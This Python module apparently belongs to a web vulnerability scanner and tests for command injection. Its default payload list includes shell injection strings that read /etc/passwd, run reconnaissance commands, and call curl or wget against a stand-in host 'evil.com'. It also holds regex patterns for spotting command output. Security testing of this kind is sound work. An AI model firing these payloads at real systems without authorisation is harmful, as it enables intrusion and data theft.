"""
Command Injection tester module.
"""

import re
from pathlib import Path
from .base_tester import BaseTester

class CommandInjectionTester(BaseTester):
    """Command Injection vulnerability tester."""
    
    def __init__(self, config):
        """Initialize command injection tester."""
        super().__init__(config)
        self.vulnerability_type = "Command Injection"
    
    def load_payloads(self):
        """Load command injection payloads from file."""
        payload_file = Path(__file__).parent.parent / 'payloads' / 'command_injection.txt'
        
        try:
            with open(payload_file, 'r') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            return payloads
        except FileNotFoundError:
            # Return default payloads if file doesn't exist
            return [
                "; ls -la",
                "&& ls -la",
                "| ls -la",
                "; whoami",
                "&& whoami",
                "| whoami",
                "; id",
                "&& id",
                "| id",
                "; pwd",
                "&& pwd",
                "| pwd",
                "; cat /etc/passwd",
                "&& cat /etc/passwd",
                "| cat /etc/passwd",
                "; uname -a",
                "&& uname -a",
                "| uname -a",
                "; ps aux",
                "&& ps aux",
                "| ps aux",
                "; netstat -an",
                "&& netstat -an",
                "| netstat -an",
                "`ls -la`",
                "`whoami`",
                "`id`",
                "`pwd`",
                "`uname -a`",
                "$(ls -la)",
                "$(whoami)",
                "$(id)",
                "$(pwd)",
                "$(uname -a)",
                "; echo 'COMMAND_INJECTION_TEST'",
                "&& echo 'COMMAND_INJECTION_TEST'",
                "| echo 'COMMAND_INJECTION_TEST'",
                "`echo 'COMMAND_INJECTION_TEST'`",
                "$(echo 'COMMAND_INJECTION_TEST')",
                "; sleep 5",
                "&& sleep 5",
                "| sleep 5",
                "`sleep 5`",
                "$(sleep 5)",
                "; ping -c 4 127.0.0.1",
                "&& ping -c 4 127.0.0.1",
                "| ping -c 4 127.0.0.1",
                "; curl http://evil.com",
                "&& curl http://evil.com",
                "| curl http://evil.com",
                "; wget http://evil.com",
                "&& wget http://evil.com",
                "| wget http://evil.com",
                "'; ls -la; echo '",
                "'; whoami; echo '",
                "'; id; echo '",
                "\"; ls -la; echo \"",
                "\"; whoami; echo \"",
                "\"; id; echo \"",
                "test; ls -la",
                "test && whoami",
                "test | id",
                "test`whoami`test",
                "test$(id)test"
            ]
    
    def analyze_response(self, payload, response):
        """Analyze response for command injection vulnerabilities."""
        if response.get('error'):
            return
        
        response_body = response.get('response_body', '')
        status_code = response.get('status_code')
        response_time = response.get('response_time', 0)
        
        # Check for command output patterns
        if self._check_command_output(payload, response_body):
            self.add_finding(
                self.vulnerability_type,
                payload,
                response,
                "Command injection detected - command output found in response",
                'High'
            )
            return
        
        # Check for time-based command injection (sleep commands)
        if self._check_time_based_injection(payload, response_time):
            self.add_finding(
                self.vulnerability_type,
                payload,
                response,
                f"Time-based command injection detected (response time: {response_time:.2f}s)",
                'High'
            )
            return
        
        # Check for error messages that might indicate command execution
        if self._check_command_errors(response_body):
            self.add_finding(
                self.vulnerability_type,
                payload,
                response,
                "Command injection detected - system error messages in response",
                'Medium'
            )
            return
        
        # Check for specific test markers
        if self._check_test_markers(payload, response_body):
            self.add_finding(
                self.vulnerability_type,
                payload,
                response,
                "Command injection detected - test marker found in response",
                'High'
            )
    
    def _check_command_output(self, payload, response_body):
        """Check for typical command output patterns."""
        # Common command output patterns
        command_patterns = [
            r'root:.*?:/root:/bin/bash',  # /etc/passwd content
            r'uid=\d+.*?gid=\d+',  # id command output
            r'total \d+',  # ls -la output
            r'Linux.*?\d+\.\d+\.\d+',  # uname -a output
            r'PID.*?TTY.*?TIME.*?CMD',  # ps aux header
            r'Active Internet connections',  # netstat output
            r'tcp.*?LISTEN',  # netstat listening ports
            r'drwxr-xr-x',  # directory permissions from ls
            r'-rw-r--r--',  # file permissions from ls
            r'/bin/.*?/usr/bin',  # common Unix paths
            r'PING.*?bytes of data',  # ping output
            r'\d+ packets transmitted',  # ping statistics
        ]
        
        for pattern in command_patterns:
            if re.search(pattern, response_body, re.IGNORECASE):
                return True
        
        return False
    
    def _check_time_based_injection(self, payload, response_time):
        """Check for time-based command injection."""
        # Check if payload contains sleep command and response took longer than expected
        sleep_patterns = [
            r'sleep\s+(\d+)',
            r'ping\s+-c\s+(\d+)',
        ]
        
        for pattern in sleep_patterns:
            match = re.search(pattern, payload, re.IGNORECASE)
            if match:
                expected_delay = int(match.group(1))
                # Allow some tolerance for network latency
                if response_time > (expected_delay - 1):
                    return True
        
        return False
    
    def _check_command_errors(self, response_body):
        """Check for system error messages that might indicate command execution."""
        error_patterns = [
            r'command not found',
            r'permission denied',
            r'no such file or directory',
            r'syntax error',
            r'bad command',
            r'invalid option',
            r'cannot access',
            r'operation not permitted',
            r'bash:.*?command not found',
            r'sh:.*?not found',
            r'/bin/sh:.*?not found',
            r'zsh:.*?command not found',
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response_body, re.IGNORECASE):
                return True
        
        return False
    
    def _check_test_markers(self, payload, response_body):
        """Check for specific test markers in the response."""
        # Look for our test markers
        test_markers = [
            'COMMAND_INJECTION_TEST',
            'command_injection_test',
        ]
        
        for marker in test_markers:
            if marker in payload and marker in response_body:
                return True
        
        return False